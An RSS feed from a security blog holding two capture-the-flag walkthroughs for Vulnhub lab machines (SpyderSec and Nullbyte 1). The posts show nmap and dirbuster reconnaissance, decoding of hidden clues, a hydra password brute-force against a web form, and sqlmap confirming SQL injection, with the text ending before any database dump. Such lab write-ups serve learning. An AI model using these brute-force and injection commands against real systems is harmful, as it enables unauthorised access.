<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Security on Unlogic</title>
    <link>http://unlogic.co.uk/tags/security/</link>
    <description>Recent content in Security on Unlogic</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 09 Sep 2015 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://unlogic.co.uk/tags/security/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SpyderSec solution</title>
      <link>http://unlogic.co.uk/2015/09/09/spydersec-solution/</link>
      <pubDate>Wed, 09 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/09/09/spydersec-solution/</guid>
      <description>&lt;p&gt;Another day, another VM. Today it&amp;rsquo;s the &lt;a href=&#34;https://www.vulnhub.com/entry/spydersec-challenge,128/&#34;&gt;SpyderSec Challenge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So let me start it up and get on it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nah3Wah.gif&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As per usual I need the IP of the machine and
the services it has running (if any). Straight from the Unlogic Cookbook&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# nmap -sn 192.168.56.0/24

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00017s latency).
MAC Address: 08:00:27:FF:57:41 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.77 seconds

root@kali:~/Downloads# nmap -p- -sV 192.168.56.101

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.101
Host is up (0.00049s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lucky me, only one service running, and it&amp;rsquo;s good old http at that.
Let&amp;rsquo;s take a look at that page then:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/IiA6MlY.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/IiA6MlY.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Without wasting much time, let&amp;rsquo;s get to the clue hunting. First things first: check the source.
And there&amp;rsquo;s clue number one, right between those script tags. It evals a function which seems to
do some text processing. I&amp;rsquo;ll open Firebug to see if that shows anything interesting, and sure
enough&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;SyntaxError&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;missing&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;statement&lt;/span&gt;
    &lt;span style=&#34;color: #ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So that&amp;rsquo;s the output from the eval. It throws an error because the result isn&amp;rsquo;t valid
javascript. It seems to me as though it might be HEX. I&amp;rsquo;ll put it through Burp&amp;rsquo;s decoder and
sure enough it resolves to &lt;code&gt;a:l:e:r:t:(:&#39;:m:u:l:d:e:r:.:f:b:i:&#39;:):;&lt;/code&gt;. That&amp;rsquo;s not going to
affect the page in any way, but I&amp;rsquo;m sure it&amp;rsquo;s a clue. I&amp;rsquo;ll note it down and carry on exploring.&lt;/p&gt;

&lt;p&gt;The CSS contains a base64 encoded gif. I decided to investigate it by converting it to a file
and opening it in Gimp to examine it. Nothing much of interest there either. Hexdump also shows
nothing of note.&lt;/p&gt;

&lt;p&gt;Ok then, apart from that there&amp;rsquo;s nothing of interest in the source, so let me move onto the images on the page.
There&amp;rsquo;s two images: &lt;code&gt;Challenge.png&lt;/code&gt; and &lt;code&gt;SpyderSecLogo200.png&lt;/code&gt;. On first glance they appear to
have nothing special about them, but once examined with &lt;code&gt;exiftool&lt;/code&gt; I see something of interest&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# exiftool Challenge.png 
ExifTool Version Number         : 9.74
File Name                       : Challenge.png
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2015:09:01 07:25:59+01:00
File Access Date/Time           : 2015:09:09 14:29:25+01:00
File Inode Change Date/Time     : 2015:09:09 14:29:19+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 540
Image Height                    : 540
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:
                                  37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:
                                  34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:
                                  33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
Image Size                      : 540x540
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hex strings are the order of the day here at SpyderSec. So back to Burp&amp;rsquo;s decoder once more
after removing all the colons. The string decodes to another hex string. Same dance again, and
I get a typical base64 string, decode once more and be rewarded with &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;. Which is
not encoded anymore. I make a note of it and carry on sleuthing.&lt;/p&gt;

&lt;p&gt;Watch out, here comes the reliable &lt;code&gt;dirbuster&lt;/code&gt;. Running it with the regular word list I discover the &lt;code&gt;v&lt;/code&gt; subdirectory.
Browsing to that however merely responds with a &lt;code&gt;403 Forbidden&lt;/code&gt; reply. I&amp;rsquo;ve not exhausted all the
nooks and crannies yet, there&amp;rsquo;s still that cookie jar to poke at.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Firebug -&amp;gt; Cookie tab -&amp;gt; URI /v/81JHPbvyEQ8729161jd6aKQ0N4/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another clue&amp;hellip;. leading me to a subdirectory under &lt;code&gt;v&lt;/code&gt;. But that&amp;rsquo;s also forbidden. Well, let
me just plug some of the data we&amp;rsquo;ve found so far into it. The random characters from the
exif data result in a 404, but the string from the javascript alert box however brings up a
download dialog for a file called &lt;code&gt;mulder.fbi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# wget http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
--2015-09-09 17:24:38--  http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13960421 (13M) [text/plain]
Saving to: ‘mulder.fbi’

mulder.fbi.1            100%[===============================&amp;gt;]  13.31M  5.52MB/s   in 2.4s   

2015-09-09 17:24:41 (5.52 MB/s) - ‘mulder.fbi’ saved [13960421/13960421]

root@kali:~/spydersec# file mulder.fbi 
mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;A video file, which when I play it, is the song &amp;ldquo;Twilight Time&amp;rdquo; by &amp;ldquo;The Platters&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;So here I hit another dead end.&lt;/p&gt;

&lt;p&gt;Let me think

&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CbfWCmv.gif&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll take inventory of the clues I have left now:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A music video &amp;ldquo;Twilight time&amp;rdquo; titled &lt;em&gt;mulder.fbi&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A seeming random string &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So I ask myself, why is a video of a song named &lt;em&gt;mulder.fbi&lt;/em&gt;? So I do a little research
and after searching for &lt;code&gt;the platters &amp;quot;twilight time&amp;quot; x files&lt;/code&gt; I hit this section in a
&lt;a href=&#34;https://en.wikipedia.org/wiki/Kill_Switch_(The_X-Files&#34;&gt;Wikipedia article&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;When he puts it into the car stereo, it plays &amp;quot;Twilight Time&amp;quot; 
by The Platters. However, the agents take it to the Lone Gunmen, 
who discover that the disc contains a large quantity of encrypted data
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well if that ain&amp;rsquo;t a clue and a bit! Ok, so a little more research of what data you
can hide in a video file (search for &lt;code&gt;hiding files video mp4&lt;/code&gt;) I am directed to a
&lt;a href=&#34;http://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file&#34;&gt;Lifehacker article&lt;/a&gt;
describing the process of hiding Truecrypt volumes in MP4s. It mentions a few ways to
detect such a volume in a video, but to be honest, I might as well just try and mount the volume.
That should be the easiest and quickest way to see if I am on the right track.&lt;/p&gt;

&lt;p&gt;Sure enough, there&amp;rsquo;s a volume in the video, but it needs a password. Well there&amp;rsquo;s only
one unused piece of the puzzle left. I plug that in and there&amp;rsquo;s our volume with the &lt;code&gt;flag.txt&lt;/code&gt; file
which contains:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Congratulations! 

You are a winner. 

Please leave some feedback on your thoughts regarding this challenge.
Was it fun? Was it hard enough or too easy? 
What did you like or dislike, what could be done better?

https://www.spydersec.com/feedback
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well that was a nice challenge, especially the truecrypt volume in the MP4. That&amp;rsquo;s
something new I learned from this. So thanks to &lt;a href=&#34;https://twitter.com/Spydersec&#34;&gt;@SpyderSec&lt;/a&gt;
for the challenge, and thanks to you for stopping by to read this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Nullbyte 1 solution</title>
      <link>http://unlogic.co.uk/2015/08/25/nullbyte-1-solution/</link>
      <pubDate>Tue, 25 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/08/25/nullbyte-1-solution/</guid>
      <description>

&lt;p&gt;I&amp;rsquo;ve been AFK for a while because of various reasons, but now I&amp;rsquo;m back and have
managed to scrape a little time together to get on with some of &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&amp;rsquo;s&lt;/a&gt;
new VMs.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s start with &lt;a href=&#34;https://www.vulnhub.com/entry/nullbyte-1,126/&#34;&gt;Nullbyte 1&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-1:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 1&lt;/h1&gt;

&lt;p&gt;I ran the usual service discovery and found:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; at 2015-08-25 11:29 BST
Nmap scan report &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.101
Host is up &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;0.00057s latency&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color: #ae81ff&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 &lt;span style=&#34;color: #f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color: #f92672&#34;&gt;))&lt;/span&gt;
111/tcp open  rpcbind 2-4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;RPC &lt;span style=&#34;color: #75715e&#34;&gt;#100000)&lt;/span&gt;
777/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span style=&#34;color: #ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;HTTP server on 80 and ssh on 777. I&amp;rsquo;m going to take the straightforward one, and head
to the HTTP server first.&lt;/p&gt;

&lt;p&gt;Upon opening the page I only get an image and some text&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SlVGKol.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I ran &lt;code&gt;dirbuster&lt;/code&gt; on the root and got a couple of hits: &lt;code&gt;uploads&lt;/code&gt; and &lt;code&gt;phpmyadmin&lt;/code&gt;. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.&lt;/p&gt;

&lt;p&gt;The source of the page doesn&amp;rsquo;t reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn&amp;rsquo;t appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# exiftool main.gif 
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : &lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt; kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;: kzMb5nVYJw
Image Size                      : 235x302
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrmm, that comment looks unusual. Let&amp;rsquo;s try that in the URL. Initially I got a 404
but that&amp;rsquo;s because I didn&amp;rsquo;t remove the &lt;code&gt;P-):&lt;/code&gt;. Hitting &lt;code&gt;http://192.168.56.101/kzMb5nVYJw&lt;/code&gt;
takes me to a form asking for a key.&lt;/p&gt;

&lt;h1 id=&#34;stage-2:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 2&lt;/h1&gt;

&lt;p&gt;Typing in something random just shows &lt;code&gt;invalid key&lt;/code&gt;. Ok, let me take a look at the source,
see where this thing goes.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;form&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;method=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;action=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
Key:&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt; 
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- this form isn&amp;#39;t connected to mysql, password ain&amp;#39;t that complex --!&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ok, so no SQLi here then, and the password isn&amp;rsquo;t complex either. I&amp;rsquo;m guessing
a simple wordlist might solve this for me. Time to break out &lt;code&gt;hydra&lt;/code&gt; for this:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# hydra 192.168.56.101 http-form-post &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot;&lt;/span&gt; -l x -P /usr/share/dict/words -t &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; -w 30
Hydra v8.1 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; starting at 2015-08-25 11:41:58
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; max &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; tasks per &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; server, overall &lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt; tasks, &lt;span style=&#34;color: #ae81ff&#34;&gt;99171&lt;/span&gt; login tries &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;l:1/p:99171&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;, ~154 tries per task
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;STATUS&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; 18687.00 tries/min, &lt;span style=&#34;color: #ae81ff&#34;&gt;18687&lt;/span&gt; tries in 00:01h, &lt;span style=&#34;color: #ae81ff&#34;&gt;80484&lt;/span&gt; todo in 00:05h, &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; active
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;80&lt;span style=&#34;color: #f92672&#34;&gt;][&lt;/span&gt;http-post-form&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; host: 192.168.56.101   login: x   password: elite
&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; of &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; target successfully completed, &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; valid password found
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Bingo. Once I enter that into the field I am able to search for usernames.&lt;/p&gt;

&lt;h1 id=&#34;stage-3:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 3&lt;/h1&gt;

&lt;p&gt;Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don&amp;rsquo;t do much, entering nothing dumps multiple records. Maybe I will
try to &lt;code&gt;sqlmap&lt;/code&gt; the URL to see if there&amp;rsquo;s any vulnerabilities there&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;

&amp;lt;snip&amp;gt;

&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; seems to be &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&amp;#39;&lt;/span&gt; injectable 
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Generic UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; automatically extending ranges &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; UNION query injection technique tests as there is at least one other &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;potential&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; technique found
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; ORDER BY technique seems to be usable. This should reduce the &lt;span style=&#34;color: #f8f8f2&#34;&gt;time &lt;/span&gt;needed to find the right number of query columns. Automatically extending the range &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; current UNION query injection technique &lt;span style=&#34;color: #f8f8f2&#34;&gt;test&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; target URL appears to have &lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt; columns in query
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; is &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt; injectable
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Result! Using this we can now dump the databasenames, tables, and data in the DB&lt;/p&gt;

&lt;p&gt;(output shortened for clarity)
